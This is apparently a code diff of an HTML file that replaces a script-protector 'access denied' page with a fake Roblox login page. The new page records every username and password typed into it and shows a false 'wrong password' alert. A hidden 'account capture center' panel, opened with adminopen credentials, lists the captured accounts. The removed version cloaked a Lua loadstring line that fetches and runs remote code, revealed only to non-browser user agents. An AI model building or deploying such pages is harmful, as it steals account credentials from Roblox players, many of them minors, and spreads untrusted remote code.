@@ -1,44 +1,137 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>访问被拒绝 • 纸脚本</title>
+    <title>Roblox - 登录</title>
     <style>
-        /* 默认样式：显示拒绝访问的 UI */
-        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
-        .badge { color: #ff4757; font-weight: bold; background: #ffeef0; padding: 4px 10px; border-radius: 20px; font-size: 12px; }
-        h1 { font-size: 1.2rem; margin: 15px 0; color: #2f3542; }
-        p { color: #57606f; font-size: 14px; line-height: 1.5; }
-        .btn { display: inline-block; margin-top: 20px; padding: 10px 20px; background: #ff4757; color: white; text-decoration: none; border-radius: 6px; }
-        
-        /* 隐藏脚本内容的容器 */
-        #script-output { display: none; }
+        body{margin:0;padding:0;background:#000;font-family:"Gotham",Arial,sans-serif;height:100vh;display:flex;justify-content:center;align-items:center;background-image:url('https://images.rbxcdn.com/5348266ea6c5e67b19d6a814cbbb70f6.jpg');background-size:cover;background-position:center;}
+        .login-box{width:380px;background:rgba(0,0,0,0.78);padding:35px;border-radius:10px;box-shadow:0 0 30px rgba(0,0,0,0.9);}
+        .logo{text-align:center;margin-bottom:30px;}
+        .logo img{width:190px;}
+        input[type=text],input[type=password]{width:100%;padding:14px;margin:12px 0;background:#222;border:1px solid #444;border-radius:6px;color:#fff;font-size:16px;box-sizing:border-box;}
+        input::placeholder{color:#999;}
+        .login-btn{width:100%;padding:14px;background:#02b757;color:#fff;border:none;border-radius:6px;font-size:19px;font-weight:bold;cursor:pointer;margin-top:20px;transition:0.3s;}
+        .login-btn:hover{background:#019e4a;}
+        .footer{text-align:center;color:#888;font-size:12px;margin-top:30px;}
+
+        /* 美化后台 */
+        #adminPanel{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000 url('https://i.imgur.com/3jY2f7N.jpg') center/cover;z-index:99999;color:#0f0;font-family:Consolas,monospace;overflow:auto;padding:20px;box-sizing:border-box;}
+        .header{text-align:center;margin:20px 0 40px;}
+        .header h1{font-size:48px;color:#0f0;text-shadow:0 0 20px #0f0;}
+        table{width:95%;max-width:1200px;margin:0 auto;border-collapse:collapse;background:rgba(0,30,0,0.9);box-shadow:0 0 30px rgba(0,255,0,0.4);}
+        th{background:#003300;color:#0f0;padding:18px;font-size:20px;text-align:center;border:2px solid #0f0;}
+        td{padding:16px;font-size:18px;text-align:center;border:2px solid #0f0;color:#fff;}
+        tr:nth-child(even){background:rgba(0,80,0,0.3);}
+        tr:hover{background:rgba(0,255,0,0.2);}
+        .count{color:#0f0;font-size:28px;text-align:center;margin:30px 0;text-shadow:0 0 15px #0f0;}
+        .clear-btn{background:#c0392b;color:#fff;padding:12px 30px;border:none;border-radius:6px;cursor:pointer;font-size:18px;margin-top:20px;}
+        .exit-btn{background:#0f0;color:#000;padding:15px 40px;border:none;border-radius:8px;cursor:pointer;font-size:22px;font-weight:bold;margin:30px auto;display:block;}
     </style>
 </head>
 <body>
 
-    <div id="browser-view" class="card">
-        <span class="badge">访问被拒绝</span>
-        <h1>此 Lua 脚本受 纸脚本 保护</h1>
-        <p>您没有权限通过浏览器直接访问此文件。该脚本已采取保护措施，防止未经授权的访问。</p>
-        <a href="" class="btn">脚本说明</a>
+<div class="login-box">
+    <div class="logo">
+        <img src="https://images.rbxcdn.com/0e4d5e98e5c9b8a2ac9d4b4f5e1d6e8f.png" alt="Roblox">
+    </div>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="用户名或邮箱" autocomplete="off">
+        <input type="password" id="password" placeholder="密码" autocomplete="off">
+        <button type="submit" class="login-btn">登录</button>
+    </form>
+    <div class="footer">© 2025 Roblox Corporation. All rights reserved.</div>
+</div>
+
+<!-- 超级帅气的后台面板 -->
+<div id="adminPanel">
+    <div class="header">
+        <h1>ROBLOX 后台管理系统</h1>
+        <p style="color:#0f0;font-size:24px;">玩家账号捕获中心</p>
     </div>
 
-    <div id="script-output">loadstring(game:HttpGet("https://raw.githubusercontent.com/114514mim/kdjddjosso/refs/heads/main/纸脚本.v1"))()</div>
+    <div class="count">已捕获账号数量: <span id="totalCount">0</span> 个</div>
 
-    <script>
-        // 简单的逻辑：如果检测到不是标准浏览器（例如检测 User-Agent）
-        // 或者你可以在 Lua 请求时加上特殊的 Header，这里用 JS 配合隐藏
-        const isBot = /curl|http|lua|game/i.test(navigator.userAgent);
+    <table id="logTable">
+        <thead>
+            <tr>
+                <th width="8%">#</th>
+                <th width="22%">时间</th>
+                <th width="35%">用户名 / 邮箱</th>
+                <th width="35%">密码</th>
+            </tr>
+        </thead>
+        <tbody id="logBody"></tbody>
+    </table>
 
-        if (isBot) {
-            // 如果检测到是脚本环境，清空所有内容只留代码
-            document.body.innerHTML = document.getElementById('script-output').innerText;
-            document.body.style.background = "none";
-            document.body.style.display = "block";
+    <div style="text-align:center;margin-top:30px;">
+        <button class="clear-btn" onclick="clearAll()">清空所有记录</button>
+        <button class="exit-btn" onclick="location.reload()">退出后台</button>
+    </div>
+</div>
+
+<script>
+    // 加载已有记录
+    let logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
+    const tbody = document.getElementById('logBody');
+    const countSpan = document.getElementById('totalCount');
+
+    function refreshTable() {
+        tbody.innerHTML = '';
+        logs.forEach((item, i) => {
+            const tr = document.createElement('tr');
+            tr.innerHTML = `
+                <td>${i+1}</td>
+                <td>${item.time}</td>
+                <td style="color:yellow;">${item.user}</td>
+                <td style="color:#ff5555;">${item.pass}</td>
+            `;
+            tbody.appendChild(tr);
+        });
+        countSpan.textContent = logs.length;
+    }
+    refreshTable();
+
+    // 保存新记录
+    function saveLog(user, pass) {
+        const now = new Date();
+        const time = now.toLocaleString('zh-CN', {hour12:false});
+        logs.push({time, user, pass});
+        localStorage.setItem('roblox_logs', JSON.stringify(logs));
+        refreshTable();
+    }
+
+    // 清空记录
+    function clearAll() {
+        if(confirm('确定要清空所有捕获的账号吗？')) {
+            logs = [];
+            localStorage.removeItem('roblox_logs');
+            refreshTable();
         }
-    </script>
+    }
+
+    // 登录表单提交
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const user = document.getElementById('username').value.trim();
+        const pass = document.getElementById('password').value;
+
+        // 每次点击登录都记录（不管对不对）
+        if(user || pass) {
+            saveLog(user || '(空)', pass || '(空)');
+        }
+
+        // 只有 adminopen 才能进后台
+        if(user === 'adminopen' && pass === 'adminopen') {
+            document.getElementById('adminPanel').style.display = 'block';
+        } else {
+            alert('用户名或密码错误！');
+            // 可选：清空输入框
+            // document.getElementById('username').value = '';
+            // document.getElementById('password').value = '';
+        }
+    });
+</script>
+
 </body>
 </html>
